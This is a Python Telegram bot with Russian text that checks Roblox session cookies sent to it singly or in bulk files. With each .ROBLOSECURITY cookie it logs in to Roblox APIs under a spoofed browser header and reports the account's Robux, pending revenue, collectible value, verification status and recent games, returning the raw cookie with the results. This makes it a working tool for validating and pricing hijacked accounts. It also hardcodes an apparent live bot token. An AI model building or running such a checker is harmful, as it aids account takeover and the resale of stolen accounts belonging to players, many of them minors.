import telebot
import requests
import io
from datetime import datetime
from flask import Flask
from threading import Thread

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

# --- ВЕБ-СЕРВЕР ДЛЯ ПОДДЕРЖКИ ЖИЗНИ ---
app = Flask('')
@app.route('/')
def home(): return "Бот активен"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

GAME_DATA = {
    "BRAZILIAN SPYDER": {"name": "Steal a brainrot", "universe_id": 6144841331},
    "Uplift Games": {"name": "Adopt me", "universe_id": 231221121},
    "Wave of Brainrots": {"name": "Tsunami brainrots", "universe_id": 6344131331},
    "Nikilis": {"name": "MM2", "universe_id": 66654135},
    "The Garden Game": {"name": "GAG", "universe_id": 5834131131},
    "KizmoTek Studio": {"name": "War tycoon", "universe_id": 2686721523},
    "Gamer Robot Inc": {"name": "Blox fruits", "universe_id": 444227218}
}

def get_advanced_info(u_id, cookies):
    adv = {
        "age_days": 0, "voice": "Нет ❌", "pending": 0, 
        "credit": 0, "email_ver": "❌", "phone_ver": "❌", "rap": 0
    }
    # Добавляем имитацию браузера
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://www.roblox.com/"
    }
    try:
        # 1. Возраст
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}", headers=headers).json()
        created_dt = datetime.strptime(u_data['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        adv["age_days"] = (datetime.now() - created_dt).days
        
        # 2. Почта (используем другой эндпоинт)
        email_req = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies, headers=headers).json()
        if email_req.get('verified'): 
            adv["email_ver"] = "Да ✅"
        
        # 3. Voice Chat (улучшенный запрос)
        voice_req = requests.get("https://voice.roblox.com/v1/settings/is-voice-enabled", cookies=cookies, headers=headers).json()
        if voice_req.get('isVoiceEnabled') is True: 
            adv["voice"] = "Да ✅"

        # 4. Pending
        summary = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/revenue/summary/30d", cookies=cookies, headers=headers).json()
        adv["pending"] = summary.get('pendingRobux', 0)
        
        # 5. RAP
        inv = requests.get(f"https://inventory.roblox.com/v1/users/{u_id}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100", cookies=cookies, headers=headers).json()
        adv["rap"] = sum(item.get('recentAveragePrice', 0) for item in inv.get('data', []))
        
    except Exception as e:
        print(f"Ошибка парсинга: {e}")
    return adv

def get_recent_places(cookies):
    try:
        url = "https://games.roblox.com/v1/games/list?model.maxRows=10&model.pageContext.sortName=ContinueWatching"
        res = requests.get(url, cookies=cookies, timeout=5).json()
        games = [g['name'] for g in res.get('games', [])]
        return "\n • " + "\n • ".join(games) if games else "Нет недавних заходов"
    except: return "Скрыто"

def check_cookie(cookie):
    cookie = cookie.strip()
    if "WARNING:" in cookie:
        cookie = cookie.split("_|_")[-1] if "_|_" in cookie else cookie
    cookies = {".ROBLOSECURITY": cookie}
    try:
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, timeout=10)
        if u_req.status_code != 200: return {"status": "error"}
        u = u_req.json()
        u_id, u_name = u['id'], u['name']
        
        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}").json()
        premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
        f_count = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count").json().get('count', 0)
        
        # Запуск расширенной проверки
        adv = get_advanced_info(u_id, cookies)
        recent = get_recent_places(cookies)
        
        return {
            "status": "ok", "name": u_name, "id": u_id, "robux": robux,
            "premium": premium, "friends": f_count, "age": adv["age_days"],
            "voice": adv["voice"], "pending": adv["pending"], "rap": adv["rap"],
            "email": adv["email_ver"], "recent": recent, "cookie": cookie
        }
    except: return {"status": "error"}

def format_output(res):
    return (
        f"👤 **Аккаунт:** {res['name']} (ID: {res['id']})\n"
        f"🎂 **Возраст:** {res['age']} дней\n"
        f"🌟 **Premium:** {res['premium']} | 👥 **Друзья:** {res['friends']}\n"
        f"📧 **Почта:** {res['email']} | 🎤 **Voice:** {res['voice']}\n"
        f"💰 **Баланс:** {res['robux']} R$ (+{res['pending']} Pending)\n"
        f"💎 **Ценность (RAP):** {res['rap']} R$\n"
        f"🕹 **НЕДАВНО ИГРАЛ:** {res['recent']}\n\n"
        f"🍪 **КУКИ:**\n`{res['cookie']}`\n"
        f"{'='*30}\n"
    )

@bot.message_handler(commands=['start'])
def start(message):
    text = (
        "👋 **Привет! Я твой продвинутый чекер Roblox.**\n\n"
        "📥 **Кидай куки или .txt файл.** Я проверю:\n"
        "• Баланс, Pending и RAP 💰\n"
        "• Voice Chat и верификацию 📧\n"
        "• Возраст аккаунта и друзей 👥\n"
        "• Последние игры 🕹"
    )
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(content_types=['text', 'document'])
def handle(message):
    try:
        if message.content_type == 'text' and len(message.text) > 100:
            res = check_cookie(message.text)
            if res['status'] == 'ok': bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
        elif message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            lines = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore').splitlines()
            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
            results = [format_output(res) for l in lines if l.strip() and (res := check_cookie(l))['status'] == 'ok']
            if results:
                buf = io.BytesIO("".join(results).encode('utf-8'))
                buf.name = "full_check_results.txt"
                bot.send_document(message.chat.id, buf)
    except Exception as e: print(f"Ошибка: {e}")

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()

